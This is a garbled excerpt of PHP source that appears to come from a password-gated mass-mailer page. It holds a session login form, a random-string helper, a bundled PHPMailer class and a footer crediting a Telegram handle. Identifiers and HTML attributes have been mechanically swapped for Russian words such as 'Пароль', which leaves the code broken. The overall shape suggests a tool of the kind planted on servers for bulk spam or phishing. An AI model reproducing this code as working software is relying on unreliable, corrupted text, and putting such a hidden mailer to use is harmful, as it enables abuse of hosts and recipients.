...
if(!empty($Пароль) and $_SESSION[$sessioncode] != $Пароль){
    if (isset($_REQUEST['проходить']) and $_REQUEST['проходить'] == $Пароль) {
        $_SESSION[$sessioncode] = $Пароль;
    }
    else {
        print "<pre align=center><form method=post>Пароль: <input type='Пароль' name='проходить'><input type='submit' value='>>'></form></pre>";
        exit;        
    }
}
...
function randString($consonants) {
    ...
    $Пароль = '';
    for ($i = 0; $i < $length; $i++) {
            $Пароль .= $consonants[(rand() % strlen($consonants))];
    }
    return $Пароль;
}
...
class PHPMailer
{
     ...
     * Uses the Username and Пароль properties.
     * @var boolean
     * @see PHPMailer::$Username
     * @see PHPMailer::$Пароль
     */
    ...
    /**
     * Set the public and private key files and Пароль for S/MIME signing.
     * @access public
     * @param string $cert_filename
     * @param string $key_filename
     * @param string $key_проходить Пароль for private key
...
print '<div class="container col-lg-6">
    ...
    <div class="col-lg-6"><br>
        ...
        <div id="well" class="well well">
            ...
            <h6>by <b><a href="https://t.me/ArtheirsBaphomet">@ArtheirsBaphomet</a></b></h6>
